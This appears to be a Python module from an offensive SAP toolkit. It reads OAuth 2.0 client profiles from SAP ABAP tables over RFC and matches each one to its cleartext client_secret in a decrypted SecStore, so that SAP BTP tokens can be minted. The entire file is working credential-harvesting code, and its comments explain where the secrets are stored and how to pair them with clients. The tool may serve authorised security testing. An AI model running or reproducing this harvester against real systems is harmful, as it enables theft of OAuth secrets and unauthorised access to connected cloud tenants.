"""OAuth 2.0 Client config harvester (transaction OA2C_CONFIG).

S/4 (and modern NW) stores OAuth 2.0 Client profiles across several
tables.  The pieces SAPMAP needs to mint a BTP token are scattered:

  ``OA2C_CLIENT``         — primary table.  Holds CLIENT_UUID (key),
                              CLIENT_ID, the token endpoint URL, the
                              client authentication method, optional
                              issuer / authorization URL, etc.
  ``OA2C_CLIENT_EXT``     — extension keyed by CLIENT_UUID.  Holds
                              GRANTTYPE (e.g. ``CLIENT_CREDENTIALS``,
                              ``AUTHORIZATION_CODE``).
  ``OA2C_PROFILES``       — profile metadata (description / display
                              name); joins to OA2C_CLIENT via
                              PROFILE_UUID or shares a name field.
  ``OA2P_SCOPES``         — OAuth scopes attached to a profile.

The corresponding ``client_secret`` lives in the SecStore under
``/OA2C/CS_<CLIENT_UUID-with-no-hyphens>_<NN>``.  Strip the hyphens
from CLIENT_UUID to match.

This reader pulls the first two tables (the minimum for a working
``client_credentials`` mint) and surfaces the rest opportunistically
when the kernel exposes those columns.  Column names vary slightly
across kernels — every read defends against missing fields.

No live SAP traffic in this module's import path; the actual RFC
calls only fire when ``read_oa2c_profiles`` is invoked from the
endpoint with credentials.
"""
from __future__ import annotations

from typing import Optional

from sapmap_models import SAPNode, Credentials


# ---------------------------------------------------------------------------
# Config: column lists per table.  We over-request and tolerate misses
# so a kernel that drops a field doesn't break the whole read.
# ---------------------------------------------------------------------------

_OA2C_CLIENT_FIELDS = [
    "CLIENT_UUID",       # primary key, joins to OA2C_CLIENT_EXT and
                         #   to /OA2C/CS_<UUID-no-hyphens>_NN secstore
    "CLIENT_ID",         # OAuth client_id (the value to send to UAA)
    "CLIENT_AUTHENTICATION", "AUTH_METHOD",
    "TOKEN_ENDPOINT", "TOKEN_URL",
    "AUTHORIZATION_ENDPOINT", "AUTH_URL",
    "ISSUER",
    "DESCRIPTION",
    "PROFILE",   # used by some kernels to link to OA2C_PROFILES
    "PROFILE_UUID",
]

_OA2C_CLIENT_EXT_FIELDS = [
    "CLIENT_UUID",
    "GRANTTYPE", "GRANT_TYPE",
]


def _normalise_uuid(raw: str) -> str:
    """Lower-case, hyphen-free, hex-only — matches the form used in
    secstore keys (``/OA2C/CS_<32hex>_<NN>``)."""
    if not raw:
        return ""
    return raw.lower().replace("-", "").replace(" ", "").strip()


def _first_present(row: dict, *keys: str) -> str:
    """Return the first non-empty value among the given keys.  Used
    because column names like TOKEN_ENDPOINT vs TOKEN_URL drift
    between kernels."""
    for k in keys:
        v = (row.get(k) or "").strip()
        if v:
            return v
    return ""


def _read_table_safely(node: SAPNode, table: str, fields: list,
                        creds: Optional[Credentials]) -> list:
    """Wrap sapmap_rfc.read_table to swallow 'unknown field' errors:
    request the union of all known column variants, let the kernel
    return whichever subset it actually has.  An exception just yields
    an empty list so the caller can decide whether to skip the row or
    continue."""
    import sapmap_rfc
    try:
        return sapmap_rfc.read_table(node, table, fields=fields,
                                       creds=creds, max_rows=500) or []
    except Exception as e:
        from sapmap_errors import format_rfc_exception
        print(f"[-] {node.sid}: read_table {table} failed — "
              f"{format_rfc_exception(e)[:160]}")
        return []


def read_oa2c_profiles(node: SAPNode,
                        creds: Optional[Credentials] = None) -> list:
    """Pull every OAuth 2.0 Client profile configured on the ABAP
    target and join the rows the BTP harvester needs into one
    flat structure.

    Returns a list of dicts, one per OA2C_CLIENT row, with these keys::

        client_uuid:        normalised (no hyphens, lowercase) — joins
                            to /OA2C/CS_<...>_NN secstore entries
        client_id:          the OAuth client_id sent at /oauth/token
        token_endpoint:     UAA URL
        grant_type:         from OA2C_CLIENT_EXT
        auth_method:        e.g. CLIENT_SECRET_BASIC
        description:        human-readable label (when present)
        profile_uuid:       links to OA2C_PROFILES (when populated)

    The matching ``client_secret`` is NOT included here — the harvester
    looks it up against ``node.secstore_entries`` by CLIENT_UUID at
    candidate-build time.
    """
    print(f"[*] {node.sid}: reading OA2C_CLIENT (OAuth 2.0 client "
          f"profiles)…")
    clients = _read_table_safely(
        node, "OA2C_CLIENT", _OA2C_CLIENT_FIELDS, creds)
    if not clients:
        print(f"[*] {node.sid}: OA2C_CLIENT empty or unreadable — "
              f"OAuth profiles not configured (or insufficient "
              f"S_TABU_DIS / S_RFC for OA2C_CLIENT).")
        return []
    print(f"[+] {node.sid}: OA2C_CLIENT returned {len(clients)} row(s)")

    print(f"[*] {node.sid}: reading OA2C_CLIENT_EXT (grant types)…")
    ext_rows = _read_table_safely(
        node, "OA2C_CLIENT_EXT", _OA2C_CLIENT_EXT_FIELDS, creds)
    grant_by_uuid = {}
    for r in ext_rows:
        uuid = _normalise_uuid(r.get("CLIENT_UUID", ""))
        gt = _first_present(r, "GRANTTYPE", "GRANT_TYPE")
        if uuid and gt:
            grant_by_uuid[uuid] = gt

    profiles = []
    for r in clients:
        uuid = _normalise_uuid(r.get("CLIENT_UUID", ""))
        if not uuid:
            continue
        profiles.append({
            "client_uuid":      uuid,
            "client_id":        (r.get("CLIENT_ID") or "").strip(),
            "token_endpoint":   _first_present(
                r, "TOKEN_ENDPOINT", "TOKEN_URL"),
            "auth_endpoint":    _first_present(
                r, "AUTHORIZATION_ENDPOINT", "AUTH_URL"),
            "issuer":           (r.get("ISSUER") or "").strip(),
            "auth_method":      _first_present(
                r, "CLIENT_AUTHENTICATION", "AUTH_METHOD"),
            "description":      (r.get("DESCRIPTION") or "").strip(),
            "profile":          _first_present(r, "PROFILE", "PROFILE_UUID"),
            "grant_type":       grant_by_uuid.get(uuid, ""),
        })
    n_btp = sum(1 for p in profiles
                 if "hana.ondemand.com" in (p["token_endpoint"] or ""))
    print(f"[+] {node.sid}: parsed {len(profiles)} OAuth profile(s) "
          f"({n_btp} pointing at BTP)")
    return profiles


def find_secret_for_profile(secstore_entries: list,
                              client_uuid: str) -> str:
    """Walk an already-decrypted SecStore and return the cleartext
    client_secret for the given OAuth profile (matched by
    ``/OA2C/CS_<CLIENT_UUID-no-hyphens>_<NN>``).  Returns "" when no
    entry matches."""
    target = _normalise_uuid(client_uuid)
    if not target:
        return ""
    for entry in (secstore_entries or []):
        if not isinstance(entry, dict):
            continue
        ident = (entry.get("ident_clean") or entry.get("ident")
                 or "").upper()
        # The ident shape is /OA2C/CS_<32HEX>_<NN>; we case-fold both
        # sides because RSECTAB historically uppercases idents.
        if "/OA2C/CS_" not in ident:
            continue
        # The hex blob between "CS_" and the trailing "_NN" is the
        # CLIENT_UUID; tolerate both lower and upper case.
        try:
            tail = ident.split("/OA2C/CS_", 1)[1]
            hex_part = tail.rsplit("_", 1)[0]
        except (IndexError, ValueError):
            continue
        if hex_part.lower() == target:
            secret = (entry.get("password") or entry.get("value")
                      or "").strip()
            if secret:
                return secret
    return ""
